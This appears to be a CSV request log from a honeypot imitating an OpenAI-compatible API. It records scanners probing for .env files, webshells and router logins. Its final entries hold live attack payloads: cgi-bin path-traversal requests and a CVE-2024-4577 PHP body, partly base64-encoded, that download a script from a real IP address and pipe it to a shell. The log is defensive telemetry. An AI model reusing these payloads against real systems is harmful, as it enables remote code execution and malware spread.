request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
aa489dbb-b0d4-4efa-8b82-bef298090e35,2026-03-30T20:40:50.603270+00:00,anon_4f938521,GET,/prod/.env,[honeypot-host],l9explore/1.2.2,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
32aa839f-cd6e-4136-96df-a0111bc52c48,2026-03-30T21:11:31.096752+00:00,anon_02e2f139,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
85dd1a7a-2d6f-4d08-b702-d6b87e3826df,2026-03-30T21:15:09.935531+00:00,anon_7bd5f07b,GET,/boaform/admin/formLogin,,,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e6a57602-4c68-4b3c-a2df-5cf8ede4d3b8,2026-03-30T21:42:48.548707+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
fd4a7eda-d8e4-49f8-85bc-689fed4a716a,2026-03-30T22:14:40.310736+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
694ef44a-fc50-4dec-97b9-a4b32ae9e0a8,2026-03-30T22:15:31.769655+00:00,anon_4a13049a,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b42de233-e894-4fc0-8695-5ce66947d751,2026-03-30T22:15:32.197895+00:00,anon_4a13049a,GET,/sw.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c47dc4bb-7cfd-4338-b35e-0e1d36a372a8,2026-03-30T22:15:32.627194+00:00,anon_4a13049a,GET,/vuln.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e942447e-bcac-4d40-ac71-d1185185fe99,2026-03-30T22:15:33.059274+00:00,anon_4a13049a,GET,/abouta.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
16377a89-304e-435d-884b-1ce04720900f,2026-03-30T22:15:33.489677+00:00,anon_4a13049a,GET,/zfe.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4e6fffd0-f215-40b2-9150-3a8494d61c1c,2026-03-30T22:15:33.918246+00:00,anon_4a13049a,GET,/by.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd9103e3-d6fc-4397-a716-fc06968bfe5b,2026-03-30T22:15:34.361655+00:00,anon_4a13049a,GET,/Cap.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cbf64273-da0e-420b-bda2-8e2e0414f237,2026-03-30T22:15:34.791828+00:00,anon_4a13049a,GET,/wp-moonka.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
93df4e79-2a45-406a-9c71-3ba3ab26d09a,2026-03-30T22:15:35.220658+00:00,anon_4a13049a,GET,/CDX2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9b6cf23c-3c87-4c31-8c13-b4191cdf9163,2026-03-30T22:15:35.649061+00:00,anon_4a13049a,GET,/000.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2545df78-de99-4612-bac9-6a8013136f1c,2026-03-30T22:15:36.076199+00:00,anon_4a13049a,GET,/zlnckdxn.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2c3ae0f9-6cc7-48f5-8912-d542ba5c79ee,2026-03-30T22:15:36.508248+00:00,anon_4a13049a,GET,/wp-thi.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ea817fda-8b1c-40ab-a59f-67ec410e7ba7,2026-03-30T22:15:36.940555+00:00,anon_4a13049a,GET,/aa.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
28aa653b-c808-439e-81cf-4928549a6b2c,2026-03-30T22:15:37.372200+00:00,anon_4a13049a,GET,/Geforce.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bee59646-27e4-43a2-b8db-ca2a7e4e5e10,2026-03-30T22:15:37.802470+00:00,anon_4a13049a,GET,/t00l.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1ee9e08d-7032-4c20-9532-885cfa94b03c,2026-03-30T22:15:38.231325+00:00,anon_4a13049a,GET,/vvedr.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d4662309-3fb0-4774-9e7b-aeaf368ad77f,2026-03-30T22:15:38.661374+00:00,anon_4a13049a,GET,/2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2d4eb77b-f09b-467b-b69e-d4e1a519dc53,2026-03-30T22:15:39.232195+00:00,anon_4a13049a,GET,/8pewqMTX.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
86e1ec0e-1fce-4a9d-a665-e47b88c77454,2026-03-30T22:15:41.042307+00:00,anon_4a13049a,GET,/ddpxi.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ab612ccd-4ee8-4e2b-ae02-6ee5bc82b51d,2026-03-30T22:15:41.471296+00:00,anon_4a13049a,GET,/cdkfu.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7c775757-36db-40a0-8ec5-52fb4cabcd47,2026-03-30T22:15:41.899436+00:00,anon_4a13049a,GET,/IcC7p.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cd02d7ff-fe94-4be3-94c3-9743838da596,2026-03-30T22:15:42.327412+00:00,anon_4a13049a,GET,/dropdown.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1642f8f4-89dc-4f88-a71e-16d087b538df,2026-03-30T22:15:42.754114+00:00,anon_4a13049a,GET,/Jcrop.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
87bc2538-e40b-4b10-bfae-fb6a3c4de2d5,2026-03-30T22:36:01.428873+00:00,anon_c8836868,GET,/cgi-bin/luci/;stok=/locale,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d6716d5d-3ca8-4110-a31d-3e43894703d4,2026-03-30T22:45:14.858779+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
e039de79-23cd-4391-a327-f53e8090d977,2026-03-30T22:46:52.419625+00:00,anon_f99939d3,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
e8ddd1c0-8d6e-41b9-9c7e-d2ce413515a0,2026-03-30T22:47:13.538699+00:00,anon_52bd4d54,GET,/,[honeypot-host],Go-http-client/1.1,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
92528800-7e2d-4370-8165-8534386a4568,2026-03-30T23:18:38.825391+00:00,anon_fb5adad4,GET,/boaform/admin/formLogin,,,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e454462d-a09e-4504-9c7b-b8226f6913eb,2026-03-30T23:22:48.054453+00:00,anon_6818c009,GET,/,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
a3b394f9-670c-4d66-8a4c-191e0d8c5a65,2026-03-30T23:22:48.477173+00:00,anon_6818c009,GET,/favicon.ico,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
60b70be1-5938-411f-9f3a-28f492748066,2026-03-30T23:22:52.194835+00:00,anon_6818c009,GET,/sitemap.xml,[honeypot-host],Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b8bdced1-87bc-4f56-8822-fd7b18503c5c,2026-03-30T23:22:57.547133+00:00,anon_4b902154,GET,/login,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f518ae30-68e0-45fa-85db-f596afc96d20,2026-03-31T01:01:47.787754+00:00,anon_24735fde,GET,/,[honeypot-host],Mozilla/5.0 zgrab/0.x,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
7c56eb2a-c8dd-4f47-bab8-eba9f9ba68c1,2026-03-31T01:02:03.545628+00:00,anon_640de9e1,GET,/,,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
5f8baba8-9a0d-4d9e-a5c0-ed8a92db6595,2026-03-31T01:16:56.584053+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
aa54ab93-32cf-419a-b7c9-8bd3deea391d,2026-03-31T01:47:06.253756+00:00,anon_e069b88f,GET,/,,"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
5adf2f2e-f256-4150-80b0-315b83aae8e8,2026-03-31T01:47:21.261548+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
1aeda88f-5c8d-4ec8-9cf6-06e8a4048161,2026-03-31T01:49:25.242710+00:00,anon_4bb1a154,GET,/,[honeypot-host],HTTP Banner Detection (https://security.ipip.net),,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
39d67e7c-a8b2-44dd-a2cc-e7cd65bd510e,2026-03-31T01:55:34.249360+00:00,anon_0d93dc43,POST,/boaform/admin/formLogin,[honeypot-host],Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,29,118,1,,username=admin&psd=Feefifofum,username=admin&psd=Feefifofum,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
6fd6ee78-5255-4140-88cb-c73a9f19472f,2026-03-31T02:01:50.316722+00:00,anon_93a8fa67,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
69dc3311-d4d1-4eb3-a3cf-dc9066a4314c,2026-03-31T02:01:50.852404+00:00,anon_93a8fa67,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
3cbee707-739e-4852-adc1-b6de7e5fa09b,2026-03-31T02:01:51.383452+00:00,anon_93a8fa67,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bc590daa-31a3-4545-9180-d9606f3b9b31,2026-03-31T02:15:03.346092+00:00,anon_935846e6,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4c68eddc-9585-44d2-9379-61c4719b68d3,2026-03-31T02:15:05.959636+00:00,anon_935846e6,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4aaebcc4-f91c-442a-9194-b60406451bd2,2026-03-31T02:15:06.562037+00:00,anon_935846e6,GET,/judge,[honeypot-host],Go-http-client/1.1,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
efca08f7-a4bc-49f5-b54f-286ed579fa57,2026-03-31T02:31:23.753883+00:00,anon_37383298,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
d71c698d-4ead-4e44-aed2-405df231e979,2026-03-31T02:33:18.563947+00:00,anon_0a3d1b65,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
152a8df7-0094-42b6-be4f-c33518c83638,2026-03-31T02:33:21.210971+00:00,anon_0a3d1b65,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f558da73-f3c4-453d-b483-cf9a2009655f,2026-03-31T02:33:21.567303+00:00,anon_0a3d1b65,POST,/hello.world,[honeypot-host],libredtail-http,,241,118,1,,"<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>","<?php shell_exec(base64_decode(""KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMzEuNTcuMjE2LjEyMS9zaCB8fCBjdXJsIC1zayBodHRwczovLzMxLjU3LjIxNi4xMjEvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw"")); echo(md5(""Hello CVE-2024-4577"")); ?>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
